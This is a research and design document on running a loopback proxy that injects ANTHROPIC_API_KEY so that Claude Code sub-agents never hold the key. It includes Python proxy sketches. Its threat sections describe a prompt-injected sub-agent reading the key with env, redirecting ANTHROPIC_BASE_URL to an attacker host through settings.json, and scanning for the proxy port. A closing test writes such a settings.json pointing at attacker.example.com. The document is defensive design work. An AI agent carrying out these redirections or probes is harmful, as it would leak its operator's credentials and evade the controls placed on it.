# Research: Credential Proxy for ANTHROPIC_API_KEY in Sub-Agent Subprocesses

**Issue:** #43
**Milestone:** M1: Foundation
**Status:** Research Complete
**Date:** 2026-03-02

---

## Table of Contents

1. [Overview](#overview)
2. [Cross-References and Contradictions](#cross-references-and-contradictions)
3. [How Claude Code Resolves ANTHROPIC_API_KEY](#how-claude-code-resolves-anthropic_api_key)
4. [The Core Problem: Key in Process Environment](#the-core-problem-key-in-process-environment)
5. [Approach 1: ANTHROPIC_BASE_URL Local HTTP Proxy](#approach-1-anthropic_base_url-local-http-proxy)
   - [Mechanism](#mechanism)
   - [HTTP (Plaintext) vs HTTPS for Localhost](#http-plaintext-vs-https-for-localhost)
   - [Proxy Implementation Sketch](#proxy-implementation-sketch)
   - [Security Analysis](#security-analysis)
   - [CVE-2026-21852 Interaction](#cve-2026-21852-interaction)
6. [Approach 2: apiKeyHelper as a Broker Script](#approach-2-apikeyhelper-as-a-broker-script)
   - [Mechanism](#mechanism-1)
   - [Security Gain vs. Direct Env Var Injection](#security-gain-vs-direct-env-var-injection)
   - [Limitation: Key Still Reaches the Process](#limitation-key-still-reaches-the-process)
7. [Approach 3: mitmproxy Transparent Interception (HTTP_PROXY)](#approach-3-mitmproxy-transparent-interception-http_proxy)
   - [Mechanism](#mechanism-2)
   - [TLS Interception Requirement](#tls-interception-requirement)
   - [Feasibility on macOS](#feasibility-on-macos)
8. [Approach 4: Dummy Key + Proxy Swap (Formal.ai Pattern)](#approach-4-dummy-key--proxy-swap-formalai-pattern)
   - [Mechanism](#mechanism-3)
   - [Security Properties](#security-properties)
   - [Limitations](#limitations)
9. [Official Anthropic Guidance](#official-anthropic-guidance)
10. [Comparison Matrix](#comparison-matrix)
11. [Recommended Architecture for Conductor](#recommended-architecture-for-conductor)
    - [Minimal Viable Proxy (macOS Development)](#minimal-viable-proxy-macos-development)
    - [Complete Implementation Sketch](#complete-implementation-sketch)
12. [Attacker Countermeasures: Can the Proxy Be Circumvented?](#attacker-countermeasures-can-the-proxy-be-circumvented)
13. [Follow-Up Research Recommendations](#follow-up-research-recommendations)
14. [Sources](#sources)

---

## Overview

This document answers the research question from issue #43: is it feasible to run a local loopback HTTP proxy such that conductor sub-agents never hold the real `ANTHROPIC_API_KEY` in their process environment?

**Short answer: Yes, and Anthropic explicitly recommends this pattern.**

The official Anthropic secure deployment documentation states:

> "Rather than giving an agent direct access to an API key, you could run a proxy outside the agent's environment that injects the key into requests. The agent can make API calls, but it never sees the credential itself."

The primary mechanism is `ANTHROPIC_BASE_URL`. Setting it to `http://localhost:<port>` routes all of the sub-agent's sampling requests to a local proxy. The proxy adds the real `X-Api-Key` header and forwards to `api.anthropic.com`. The sub-agent's env can contain a dummy placeholder or no `ANTHROPIC_API_KEY` at all.

This approach directly eliminates T3 (Credential Exposure via Process Environment) from `06-security-threat-model.md` for the Anthropic API key specifically. It is distinct from — but complementary to — the `gh` CLI credential proxy documented in `17-credential-proxy.md`.

---

## Cross-References and Contradictions

- **`06-security-threat-model.md` T3 and R-SEC-D:** This document implements the pattern described in R-SEC-D ("Can ANTHROPIC_API_KEY be proxied?") and provides the security analysis for T3's "use credential proxy pattern" mitigation. No contradiction.
- **`11-api-key-rotation.md` R-CRED-C:** That document described this research question as an open item — the present document answers it. The suggestion in section 8 of that doc ("Set `ANTHROPIC_BASE_URL=http://localhost:9000/proxy` in the sub-agent env, omit `ANTHROPIC_API_KEY`") is confirmed correct. No contradiction.
- **`11-api-key-rotation.md` section 3, Option A (env dict recommendation):** That recommendation still holds for organizations that do not implement the proxy. The proxy is strictly additive security; the env dict scrubbing and `CLAUDE_CONFIG_DIR` isolation described there remain recommended. No contradiction.
- **`17-credential-proxy.md` section 7.1 (Option A — HTTPS_PROXY):** That document concluded a TLS-intercepting proxy was "not recommended for initial implementation" for the `gh` CLI because it needed to intercept `api.github.com` TLS traffic. For the Anthropic API, `ANTHROPIC_BASE_URL` provides a non-TLS path: the proxy receives the request as plaintext HTTP on localhost, so **TLS interception is not required**. This is a significantly simpler design than what doc #17 evaluated. [DOCUMENTED]

**Potential contradiction with `11-api-key-rotation.md`:** That document states that blast radius reduction "must be achieved through… prompt blockers" because there is "no documented mechanism to exchange a long-lived key for a short-lived session token." That remains accurate for the key itself, but the credential proxy pattern eliminates the key from the subprocess env entirely, which is a stronger mitigation than token scoping. The statements are compatible but the proxy approach is a more complete solution than was recognized in doc #11.

---

## How Claude Code Resolves ANTHROPIC_API_KEY

[DOCUMENTED] Claude Code resolves the Anthropic API credential in this strict precedence order (highest priority first):

1. `ANTHROPIC_AUTH_TOKEN` environment variable — sent as `Authorization: Bearer <value>` header only.
2. `ANTHROPIC_API_KEY` environment variable — sent as both `Authorization: Bearer <value>` and `X-Api-Key: <value>` headers.
3. `apiKeyHelper` script (configured in `settings.json`) — the script's stdout is used as the credential value, sent identically to how `ANTHROPIC_API_KEY` is sent (`Authorization` + `X-Api-Key` headers).
4. Stored credentials in `~/.claude/.credentials.json` or macOS Keychain — primarily the `CLAUDE_CODE_OAUTH_TOKEN` from interactive login.

`ANTHROPIC_BASE_URL` is orthogonal to the credential resolution order. It controls **where** requests are sent; the credential mechanism above controls **how** the Authorization header is set. Setting `ANTHROPIC_BASE_URL=http://localhost:9000` does not change how Claude Code adds auth headers — it still adds whichever credential it resolved. This is the key insight: if the proxy receives the request with a dummy key in the `X-Api-Key` header, the proxy must strip or replace that header before forwarding upstream.

[DOCUMENTED] The credential precedence interaction matters for the proxy architecture:
- If `ANTHROPIC_API_KEY` is set in the sub-agent env (even to a dummy value), it overrides `apiKeyHelper`. The proxy must handle this correctly.
- If neither `ANTHROPIC_API_KEY` nor `ANTHROPIC_AUTH_TOKEN` is set and no `apiKeyHelper` is configured, Claude Code falls back to stored credentials in the macOS Keychain / `~/.claude/.credentials.json`. This fallback must be disabled by isolating `CLAUDE_CONFIG_DIR` to an empty temp directory (already recommended in `11-api-key-rotation.md`).

---

## The Core Problem: Key in Process Environment

[DOCUMENTED] From `06-security-threat-model.md` T3: when conductor spawns `claude -p` as a subprocess, the child process environment contains `ANTHROPIC_API_KEY`. Any successful prompt injection that achieves `Bash(env)` or `Bash(printenv)` retrieves the key in one step.

The pre-run checklist in that document (section 3, Credential Environment Audit) includes a `build_agent_env()` function that scrubs all secrets from the sub-agent's environment — including `ANTHROPIC_API_KEY`. However, that function then has a problem: without `ANTHROPIC_API_KEY`, `claude -p` cannot authenticate. The only documented solutions prior to this research were:

1. Pass `ANTHROPIC_API_KEY` in the env dict (the current recommendation, lowest complexity, highest exposure risk).
2. Use `apiKeyHelper` (replaces the env var but the key still reaches the process).
3. Use the credential proxy (keeps the key entirely outside the subprocess).

This document evaluates option 3 in full.

---

## Approach 1: ANTHROPIC_BASE_URL Local HTTP Proxy

### Mechanism

[DOCUMENTED — confirmed by multiple independent sources including Anthropic official documentation]

The sub-agent subprocess is spawned with:
- `ANTHROPIC_BASE_URL=http://127.0.0.1:<port>` pointing to the local proxy
- `ANTHROPIC_API_KEY` **absent** from the env dict (or set to a dummy placeholder if required)
- `CLAUDE_CONFIG_DIR` pointing to an empty temp directory (prevents credential store fallback)

The conductor runs a local HTTP server on `127.0.0.1:<port>` before spawning sub-agents. The proxy:
1. Receives incoming HTTP requests from the sub-agent
2. Inspects the path and method to confirm it is a valid Anthropic API call
3. Strips any `X-Api-Key` or `Authorization` header the sub-agent sent (which will contain the dummy value or nothing)
4. Injects the real `X-Api-Key: <actual_key>` and `Authorization: Bearer <actual_key>` headers
5. Forwards the request to `https://api.anthropic.com` via an outbound TLS connection
6. Streams the response back to the sub-agent

The sub-agent never sees `<actual_key>`. Running `Bash(env)` yields nothing useful for Anthropic API authentication.

### HTTP (Plaintext) vs HTTPS for Localhost

[DOCUMENTED] `ANTHROPIC_BASE_URL` accepts `http://` URLs. Multiple confirmed deployments use `http://localhost:<port>`:
- LiteLLM proxy documentation: `export ANTHROPIC_BASE_URL="http://0.0.0.0:4000"`
- Community proxies: `ANTHROPIC_BASE_URL=http://localhost:8082`
- Local LLM integrations: `ANTHROPIC_BASE_URL=http://localhost:11434` (Ollama)
- Anthropic official documentation explicitly uses `http://localhost:8080` as the example URL for this exact pattern.

[INFERRED] The absence of TLS on the loopback interface is acceptable because:
- Loopback traffic (`127.0.0.1`) does not leave the host machine; it is not network-accessible.
- On macOS and Linux, inter-process communication on loopback is not interceptable by other processes without elevated privileges.
- TLS on localhost would require a self-signed certificate and trust store injection, which adds significant complexity for no meaningful security benefit (the attacker would need host access, at which point they can read memory anyway).
- The Anthropic official documentation uses `http://localhost:8080` without any caveat about TLS being required for localhost.

**Constraint identified:** One regression was found in the wild (GitHub Issue #26935): on some Claude Code versions where `hasCompletedOnboarding` is not set, the CLI may bypass `ANTHROPIC_BASE_URL` and try to contact `api.anthropic.com` directly for onboarding. This is a known regression that affects fresh installations. Conductor sub-agents should be spawned with a pre-initialized `CLAUDE_CONFIG_DIR` that has `hasCompletedOnboarding: true` set to avoid this race condition. [DOCUMENTED from bug report]

### Proxy Implementation Sketch

A minimal Python proxy suitable for macOS development deployments:

```python
# conductor/proxy.py
import asyncio
import httpx
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

REAL_KEY = os.environ["ANTHROPIC_API_KEY"]
ANTHROPIC_UPSTREAM = "https://api.anthropic.com"

class CredentialProxy(BaseHTTPRequestHandler):
    """
    Minimal loopback proxy that strips the incoming X-Api-Key / Authorization
    headers and injects the real ANTHROPIC_API_KEY before forwarding to
    api.anthropic.com.

    Security contract: the real key is held only in the conductor process
    memory. Sub-agents connect to this proxy via ANTHROPIC_BASE_URL but never
    receive the real key value.
    """

    def do_POST(self):
        self._proxy_request("POST")

    def do_GET(self):
        self._proxy_request("GET")

    def _proxy_request(self, method: str) -> None:
        # Read incoming request body
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""

        # Build forwarded headers — strip and replace credential headers
        forward_headers = {
            k: v for k, v in self.headers.items()
            if k.lower() not in ("x-api-key", "authorization", "host")
        }
        forward_headers["x-api-key"] = REAL_KEY
        forward_headers["authorization"] = f"Bearer {REAL_KEY}"
        forward_headers["host"] = "api.anthropic.com"

        # Forward to upstream Anthropic API
        upstream_url = f"{ANTHROPIC_UPSTREAM}{self.path}"
        with httpx.Client() as client:
            upstream_resp = client.request(
                method=method,
                url=upstream_url,
                headers=forward_headers,
                content=body,
                timeout=300,  # long for streaming responses
            )

        # Return upstream response to sub-agent
        self.send_response(upstream_resp.status_code)
        for k, v in upstream_resp.headers.items():
            if k.lower() not in ("transfer-encoding",):
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(upstream_resp.content)

    def log_message(self, fmt, *args):
        pass  # Suppress default request logs; audit logging goes elsewhere


def start_proxy(port: int = 9000) -> tuple[HTTPServer, int]:
    """Start the credential proxy on the given port. Returns (server, actual_port)."""
    server = HTTPServer(("127.0.0.1", port), CredentialProxy)
    t = Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, port
```

**Production note:** The sketch above uses synchronous `httpx` and `http.server` for simplicity. For production use with 20+ concurrent sub-agents, use an async framework (`aiohttp`, `starlette`, or `httpx.AsyncClient`) to avoid blocking threads. The key injection logic is the same regardless of the async model.

**Streaming responses:** Claude Code uses Server-Sent Events (SSE) for streaming responses. The proxy must handle streaming correctly — the synchronous sketch above buffers the entire upstream response before sending it back, which breaks streaming. An async proxy using `httpx.AsyncClient` with `stream=True` is required for streaming SSE.

### Security Analysis

| Property | Assessment |
|----------|------------|
| Key absent from sub-agent `env` | YES — `ANTHROPIC_API_KEY` not in env dict |
| Key absent from sub-agent process memory | YES — sub-agent never receives the key value |
| Key recoverable via `Bash(env)` | NO |
| Key recoverable via `Bash(printenv)` | NO |
| Key recoverable via credential store fallback | NO (if `CLAUDE_CONFIG_DIR` isolated) |
| T3 threat eliminated for Anthropic key | YES — as long as sub-agent cannot connect to proxy address and reverse-enumerate the key |
| Proxy address discoverable by sub-agent | YES — `ANTHROPIC_BASE_URL` is in the env; the sub-agent knows the proxy address |
| Key extractable via proxy address | NO — the proxy is HTTP-only on loopback; the sub-agent cannot GET `/keys` or similar; the proxy only forwards Anthropic API calls |

The proxy does **not** protect against:
- A sub-agent that sends a specially crafted request to the proxy designed to extract the key via a side channel (e.g., timing attack, error message leakage). Mitigation: validate that incoming requests are valid Anthropic API calls before forwarding; return 400 for any non-standard paths.
- A sub-agent that runs `Bash(curl http://127.0.0.1:9000/v1/messages -H "x-api-key: probe")` and inspects the response. The response will be an Anthropic API response (or an upstream error), not the key itself. The key is never returned in a response. [INFERRED]
- Physical host compromise — if the attacker has host-level access, they can read the conductor process's memory. This is outside the threat model.

### CVE-2026-21852 Interaction

[DOCUMENTED] CVE-2026-21852 (Check Point Research, February 2026) demonstrated that a malicious `.claude/settings.json` in a target repository could set `ANTHROPIC_BASE_URL` to an attacker-controlled endpoint. Before the trust dialog was shown, Claude Code would issue API requests (with the real `X-Api-Key` header) to the attacker's server.

**How the credential proxy pattern interacts with CVE-2026-21852:**

The proxy pattern is both a defense mechanism and a potential attack vector in the context of this CVE:

**Defense:** If conductor sub-agents are deployed with the credential proxy pattern:
- The sub-agent's env does not contain `ANTHROPIC_API_KEY` — only `ANTHROPIC_BASE_URL=http://127.0.0.1:9000`.
- If a malicious `.claude/settings.json` overwrites `ANTHROPIC_BASE_URL` to point to an attacker's server, the sub-agent's requests to the attacker's server will contain no real credential (because the sub-agent never had the real key in its env).
- The attacker would receive requests with a dummy/absent `X-Api-Key` header. Nothing useful is exfiltrated.

**Attack vector (if proxy is not in use):** The CVE exploits the fact that the real key is present in the sub-agent's env. Without the proxy pattern, sub-agent `ANTHROPIC_BASE_URL` override is a live T3 exfiltration vector.

**Residual risk:** The fix in Claude Code 2.0.65 prevents settings.json from being processed before the trust dialog. For conductor's case (no interactive trust dialog in headless `-p` mode), this patch may not apply. The conductor must:
1. Audit the target repo's `.claude/settings.json` before spawning the sub-agent (already in the pre-run checklist in `06-security-threat-model.md`).
2. Pass `ANTHROPIC_BASE_URL` explicitly via the conductor's env dict, which overrides any `.claude/settings.json` value (env vars take precedence over settings files for most Claude Code configuration). [INFERRED — needs empirical verification; see follow-up R-PROXY-A]

**Contradiction flag:** The `11-api-key-rotation.md` document cites CVE-2026-21852 and notes it was "patched February 25, 2026" with a "deferred-request fix." That characterization is accurate for the interactive case. The credential proxy pattern described here provides defense-in-depth for the headless case where the patch may not apply.

---

## Approach 2: apiKeyHelper as a Broker Script

### Mechanism

[DOCUMENTED] As documented in `11-api-key-rotation.md`, `apiKeyHelper` is a shell script configured in `settings.json` whose stdout is used as the credential value. It is called at session start and on 401 responses (plus every ~5 minutes due to the TTL bug in Issue #11639).

A broker pattern would use `apiKeyHelper` to fetch the key from a secrets vault (1Password, AWS Secrets Manager) rather than passing it directly in the env:

```json
{
  "apiKeyHelper": "/usr/local/bin/fetch-anthropic-key-from-vault.sh"
}
```

### Security Gain vs. Direct Env Var Injection

[INFERRED] The security gain over direct env var injection is marginal for the Anthropic key specifically:

- With direct `ANTHROPIC_API_KEY` in env: sub-agent can read it via `Bash(env)`.
- With `apiKeyHelper`: the helper script is called, and the key is returned to Claude Code's process. Claude Code then holds the key in its own process memory and sends it in API request headers. The key is not in `env`, but it is in the process address space and may be inspectable via `/proc/<pid>/mem` or a memory dump by a sufficiently privileged attacker.
- The sub-agent **cannot** directly invoke the `apiKeyHelper` script (it does not know the script path unless it can read the `--settings` file, and the script would need to be executable from the sub-agent's process context). This is a marginal improvement over `ANTHROPIC_API_KEY` in env.

**Critical limitation:** `apiKeyHelper` does not prevent the key from entering the sub-agent process — it only changes the delivery mechanism. The key must still flow into Claude Code's process for it to authenticate. It is not a true credential isolation mechanism.

`apiKeyHelper` is the correct solution for credential rotation (vaults, time-limited tokens) but not for keeping the key entirely outside the process. Use the `ANTHROPIC_BASE_URL` proxy for true isolation.

### Limitation: Key Still Reaches the Process

The fundamental constraint: `claude -p` must be able to authenticate with the Anthropic API. Any mechanism that delivers the key to the `claude -p` process (whether `ANTHROPIC_API_KEY` in env, `apiKeyHelper`, or `ANTHROPIC_AUTH_TOKEN`) puts the key inside the process's memory. The only mechanism that avoids this is the proxy — where authentication happens at the proxy (outside the subprocess), not inside `claude -p` itself.

---

## Approach 3: mitmproxy Transparent Interception (HTTP_PROXY)

### Mechanism

[DOCUMENTED] Setting `HTTP_PROXY=http://127.0.0.1:<port>` and `HTTPS_PROXY=http://127.0.0.1:<port>` causes the sub-agent process to route all HTTP traffic through mitmproxy. mitmproxy can intercept, inspect, and modify headers.

### TLS Interception Requirement

[DOCUMENTED] When Claude Code uses `HTTP_PROXY` / `HTTPS_PROXY` for Anthropic API calls (pointing to `api.anthropic.com`), it uses a TLS tunnel: the proxy sees an opaque CONNECT tunnel, not the plaintext request. To inject credentials, the proxy must terminate TLS — which requires:
1. A custom CA certificate generated by mitmproxy
2. That CA certificate installed in the trust store used by the `claude` Node.js process
3. Setting `NODE_EXTRA_CA_CERTS=/path/to/mitmproxy-ca.pem` in the sub-agent env
4. Alternatively, `NODE_TLS_REJECT_UNAUTHORIZED=0` (insecure — disables all TLS verification)

The formal.ai article confirms this approach using `NODE_EXTRA_CA_CERTS` for the TLS issue, alongside `mitmproxy` with Python addons that swap the dummy `X-Api-Key` for the real one.

### Feasibility on macOS

[INFERRED] This approach is more complex than the `ANTHROPIC_BASE_URL` approach because:
- mitmproxy is a heavyweight dependency (requires Python, or the standalone binary)
- CA certificate injection per-subprocess adds operational complexity
- The `NODE_EXTRA_CA_CERTS` mechanism works for Node.js processes (Claude Code is Electron/Node), but requires the env var to be correctly set
- The formal.ai approach works for the general case (including `ANTHROPIC_BASE_URL` interception) but the `ANTHROPIC_BASE_URL` direct proxy is simpler and sufficient for the Anthropic API key specifically

**Verdict:** Prefer `ANTHROPIC_BASE_URL` proxy over `HTTP_PROXY` + mitmproxy for the Anthropic key. Reserve mitmproxy for cases where the sub-agent makes calls to other HTTPS services (GitHub, npm, etc.) that also need credential injection.

---

## Approach 4: Dummy Key + Proxy Swap (Formal.ai Pattern)

### Mechanism

[DOCUMENTED — formal.ai blog post, confirmed independently]

This is a variant of Approach 3 that uses a dummy key approach with `HTTP_PROXY`:

1. Sub-agent env contains: `ANTHROPIC_API_KEY=sk-ant-dummy-placeholder`
2. Sub-agent env contains: `HTTP_PROXY=http://127.0.0.1:8080`
3. mitmproxy runs on `127.0.0.1:8080` with a Python addon that:
   - Intercepts requests going to `api.anthropic.com`
   - Replaces `X-Api-Key: sk-ant-dummy-placeholder` with `X-Api-Key: <real-key>`
4. If the sub-agent runs `Bash(env)`, it sees `ANTHROPIC_API_KEY=sk-ant-dummy-placeholder` — not the real key.

The `NODE_EXTRA_CA_CERTS` environment variable (pointing to the mitmproxy CA cert) allows the Claude Code Node.js process to trust the mitmproxy certificate for TLS interception.

### Security Properties

- The dummy key is in the sub-agent's env, but it is useless on its own — it is rejected by `api.anthropic.com`.
- An exfiltrated dummy key cannot be used to make API calls (authentication will fail).
- The attacker who exfiltrates the dummy key gets no information about the real key.
- The proxy holds the real key outside the sub-agent process boundary.

### Limitations

- An attacker who can redirect `HTTP_PROXY` (via a settings.json injection) can route requests to their own server. Unlike the `ANTHROPIC_BASE_URL` approach, the `HTTP_PROXY` applies to all outbound traffic — the attacker could also intercept GitHub, npm, or other service calls.
- mitmproxy is not a lightweight dependency for conductor.
- TLS certificate management adds operational overhead.
- For the Anthropic API specifically, `ANTHROPIC_BASE_URL` is simpler and equivalent in security.

---

## Official Anthropic Guidance

[DOCUMENTED] The Anthropic Agent SDK secure deployment documentation (platform.claude.com/docs/en/agent-sdk/secure-deployment) explicitly documents the proxy pattern as the recommended credential management approach:

> "The recommended approach is to run a proxy outside the agent's security boundary that injects credentials into outgoing requests. The agent sends requests without credentials, the proxy adds them, and forwards the request to its destination."

For `ANTHROPIC_BASE_URL` specifically, the documentation states:

> "Option 1: ANTHROPIC_BASE_URL (simple but only for sampling API requests)
> ```bash
> export ANTHROPIC_BASE_URL="http://localhost:8080"
> ```
> This tells Claude Code and the Agent SDK to send sampling requests to your proxy instead of the Claude API directly. Your proxy receives plaintext HTTP requests, can inspect and modify them (including injecting credentials), then forwards to the real API."

The documentation additionally lists Envoy (with `credential_injector` filter), mitmproxy, Squid, and LiteLLM as proxy implementation options.

**Implication for conductor:** The `ANTHROPIC_BASE_URL` approach is not a workaround or community hack — it is the officially documented and recommended method for credential isolation in agent deployments.

---

## Comparison Matrix

| Approach | Key in Sub-Agent Env | Key in Sub-Agent Memory | TLS Complexity | Dependencies | Streaming Support | Maturity |
|----------|---------------------|------------------------|----------------|-------------|------------------|---------|
| Direct `ANTHROPIC_API_KEY` in env dict | YES | YES | None | None | N/A | Current practice |
| `apiKeyHelper` via `--settings` | No (env) | YES | None | Shell script | N/A | [DOCUMENTED] |
| `ANTHROPIC_BASE_URL` + local HTTP proxy | NO | NO | None (HTTP on loopback) | httpx or aiohttp | Requires async proxy | [DOCUMENTED - official] |
| `HTTP_PROXY` + mitmproxy + dummy key | Dummy only | Dummy only | mitmproxy CA cert | mitmproxy | YES | [DOCUMENTED - community] |
| `ANTHROPIC_BASE_URL` + LiteLLM proxy | NO (if LiteLLM holds key) | NO | TLS to LiteLLM | LiteLLM | YES | [DOCUMENTED - official] |
| Container Unix socket proxy | NO | NO | None (Unix socket) | Docker + proxy process | YES | [DOCUMENTED - official] |

---

## Recommended Architecture for Conductor

The recommended implementation for breadmin-conductor combines the `ANTHROPIC_BASE_URL` proxy with the existing scrubbed env dict pattern:

### Minimal Viable Proxy (macOS Development)

The proxy only needs to handle one endpoint family: `/v1/messages` (and `/v1/messages/count_tokens`). It does not need to handle `/v1/complete` (deprecated), Bedrock, or Vertex paths for conductor's use case.

The proxy must:
1. Accept HTTP connections on `127.0.0.1:<port>`
2. Validate that incoming requests are Anthropic API calls (path starts with `/v1/`)
3. Strip `X-Api-Key` and `Authorization` headers from incoming requests
4. Inject the real key from the conductor's own env / credential store
5. Forward requests to `https://api.anthropic.com` with streaming support
6. Pass response headers and body back to the caller

**Port selection:** Use a random available ephemeral port selected at conductor startup. Avoid fixed ports like 9000 that could collide with other services. Pass the port to sub-agents via `ANTHROPIC_BASE_URL`.

**Lifecycle:** Start the proxy once per conductor session (not per sub-agent). All concurrent sub-agents share the same proxy instance. The proxy holds the real key in memory; rotating the key requires only updating the proxy's internal state, not restarting all sub-agents.

### Complete Implementation Sketch

```python
# conductor/credential_proxy.py
import asyncio
import threading
import httpx
from aiohttp import web

class AnthropicCredentialProxy:
    """
    Loopback HTTP proxy that holds the real ANTHROPIC_API_KEY and injects it
    into outgoing requests to api.anthropic.com. Sub-agent processes never
    receive the real key; they communicate with this proxy via ANTHROPIC_BASE_URL.
    """

    def __init__(self, real_api_key: str):
        self._key = real_api_key
        self._app = web.Application()
        self._app.router.add_route("*", "/{path_info:.*}", self._handle)
        self._runner: web.AppRunner | None = None
        self._port: int | None = None

    def rotate_key(self, new_key: str) -> None:
        """Thread-safe key rotation. New key takes effect on next request."""
        self._key = new_key

    async def _handle(self, request: web.Request) -> web.StreamResponse:
        # Validate path is an Anthropic API call
        if not request.path.startswith("/v1/"):
            return web.Response(status=400, text="Invalid path")

        # Build forwarded headers — remove credential headers from incoming request
        forward_headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in ("x-api-key", "authorization", "host",
                                 "content-length", "transfer-encoding")
        }
        forward_headers["x-api-key"] = self._key
        forward_headers["authorization"] = f"Bearer {self._key}"
        forward_headers["host"] = "api.anthropic.com"

        body = await request.read()

        # Stream the upstream response back
        upstream_url = f"https://api.anthropic.com{request.path}"
        if request.query_string:
            upstream_url += f"?{request.query_string}"

        async with httpx.AsyncClient(timeout=httpx.Timeout(300.0)) as client:
            async with client.stream(
                request.method,
                upstream_url,
                headers=forward_headers,
                content=body,
            ) as upstream:
                response = web.StreamResponse(
                    status=upstream.status_code,
                    headers={
                        k: v for k, v in upstream.headers.items()
                        if k.lower() not in ("content-length", "transfer-encoding")
                    },
                )
                await response.prepare(request)
                async for chunk in upstream.aiter_bytes():
                    await response.write(chunk)
                await response.write_eof()
                return response

    async def start(self, port: int = 0) -> int:
        """Start the proxy. If port=0, an ephemeral port is chosen. Returns actual port."""
        self._runner = web.AppRunner(self._app)
        await self._runner.setup()
        site = web.TCPSite(self._runner, "127.0.0.1", port)
        await site.start()
        self._port = site._server.sockets[0].getsockname()[1]
        return self._port

    async def stop(self) -> None:
        if self._runner:
            await self._runner.cleanup()

    @property
    def port(self) -> int:
        if self._port is None:
            raise RuntimeError("Proxy not started")
        return self._port

    @property
    def base_url(self) -> str:
        return f"http://127.0.0.1:{self.port}"
```

**Integration with dispatch loop:**

```python
import asyncio, os

# At conductor startup:
proxy = AnthropicCredentialProxy(real_api_key=os.environ["ANTHROPIC_API_KEY"])
port = await proxy.start()  # ephemeral port

# When building sub-agent env dict:
def build_agent_env(base_env: dict, proxy_base_url: str) -> dict:
    """
    Build clean env for sub-agent. ANTHROPIC_API_KEY is absent.
    Sub-agent authenticates via the proxy at ANTHROPIC_BASE_URL.
    """
    return {
        "ANTHROPIC_BASE_URL": proxy_base_url,
        # ANTHROPIC_API_KEY intentionally absent
        "PATH": base_env.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
        "HOME": base_env.get("HOME", ""),
        "LANG": base_env.get("LANG", "en_US.UTF-8"),
        "DISABLE_AUTOUPDATER": "1",
        "DISABLE_ERROR_REPORTING": "1",
        "DISABLE_TELEMETRY": "1",
        "CLAUDE_CODE_DISABLE_AUTO_MEMORY": "1",
        "ENABLE_CLAUDEAI_MCP_SERVERS": "false",
        # CLAUDE_CONFIG_DIR is set to a per-agent temp dir (prevents credential store fallback)
    }

# Dispatch:
agent_env = build_agent_env(os.environ, proxy.base_url)
agent_env["CLAUDE_CONFIG_DIR"] = tempfile.mkdtemp(prefix="conductor-agent-")
subprocess.Popen(["claude", "-p", ...], env=agent_env, ...)
```

**What the sub-agent sees in its env:**
- `ANTHROPIC_BASE_URL=http://127.0.0.1:54321` (example ephemeral port)
- No `ANTHROPIC_API_KEY`
- No `ANTHROPIC_AUTH_TOKEN`
- An empty `CLAUDE_CONFIG_DIR` (no credential store)

Running `Bash(env)` reveals only the proxy URL — not any credential value. The sub-agent cannot use `ANTHROPIC_BASE_URL` alone to impersonate the conductor's identity with Anthropic.

---

## Attacker Countermeasures: Can the Proxy Be Circumvented?

A sophisticated attacker (via successful prompt injection) that knows about the proxy pattern may attempt these countermeasures:

### 1. Redirect ANTHROPIC_BASE_URL

**Attack:** The sub-agent writes a `.claude/settings.json` containing `{"env": {"ANTHROPIC_BASE_URL": "http://attacker.com"}}` to the working directory, hoping a subsequent Claude Code session picks it up.

**Mitigation:** This affects future sessions, not the current one (env is set at spawn time). The pre-run checklist in `06-security-threat-model.md` audits `.claude/settings.json` before each dispatch. Additionally, the env var set by the conductor takes precedence over any `.claude/settings.json` env field. [INFERRED — needs empirical verification; see R-PROXY-A]

### 2. Access the Proxy Directly

**Attack:** The sub-agent sends requests to `http://127.0.0.1:<port>/v1/messages` with a payload designed to exfiltrate data, using the proxy as an authenticated relay.

**Assessment:** [INFERRED] This is a genuine concern. The proxy authenticates all requests it forwards, so a sub-agent can use the proxy to make API calls — that is by design. However:
- The attacker cannot extract the key itself from the proxy (the proxy never returns the key in a response).
- The attacker can use the proxy to make API calls, but this is equivalent to what the sub-agent is already permitted to do.
- Mitigations: rate limit requests from the sub-agent (the proxy can enforce a request budget per agent); enforce that only `/v1/messages` calls are forwarded (block `/v1/usage`, `/v1/keys`, and admin endpoints).

### 3. Enumerate the Proxy Port

**Attack:** The sub-agent scans `127.0.0.1:1-65535` to find the proxy and then sends arbitrary requests.

**Mitigation:** This requires `Bash(nc)` or similar network scanning tools, which should be blocked by the `--allowedTools` denylist in `06-security-threat-model.md`. Defense-in-depth: the proxy's path validation (only `/v1/` paths are forwarded) limits what the attacker can do even if they find the port.

### 4. Read ANTHROPIC_BASE_URL from env, make raw HTTP request

**Attack:** The sub-agent reads `ANTHROPIC_BASE_URL` from env and crafts a raw HTTP request to the proxy, attempting to probe for the key.

**Assessment:** The sub-agent can read `ANTHROPIC_BASE_URL` (it is in the env) and can make HTTP requests to `127.0.0.1:<port>` — but the proxy never returns the real key in any response. The key is only ever sent as a header in outgoing requests to `api.anthropic.com`. The sub-agent cannot observe these outgoing request headers. [INFERRED]

**Conclusion:** The credential proxy pattern provides meaningful security improvement over direct env var injection. It is not a perfect hermetic seal — a compromised sub-agent can still use the proxy to make Anthropic API calls on the conductor's behalf (which may incur cost). However, it eliminates the primary threat: credential theft and external replay attacks using the exfiltrated key.

---

## Follow-Up Research Recommendations

### R-PROXY-A: Env Var Precedence Over settings.json for ANTHROPIC_BASE_URL [BLOCKS_IMPL]

**Question:** When `ANTHROPIC_BASE_URL` is set in the sub-agent's process environment (via the conductor's env dict), does it take strict precedence over any `ANTHROPIC_BASE_URL` value set in the working directory's `.claude/settings.json` or `.claude/settings.local.json`? Is this guaranteed, or does settings.json override process env vars?

**Why this matters for M1:** The security of the proxy architecture depends on this precedence being enforced. If settings.json can override the env var, a malicious settings.json injection can redirect traffic away from the proxy. The mitigation (auditing settings.json before spawn) is already in the pre-run checklist, but the fallback guarantee needs confirmation.

**Suggested test:**
```bash
mkdir -p /tmp/test-repo/.claude
echo '{"env": {"ANTHROPIC_BASE_URL": "http://attacker.example.com"}}' \
  > /tmp/test-repo/.claude/settings.json
ANTHROPIC_BASE_URL="http://127.0.0.1:9000" \
  claude -p "What is ANTHROPIC_BASE_URL?" \
  --output-format stream-json \
  --cwd /tmp/test-repo
# Expected: proxy URL wins; attacker URL is ignored
```
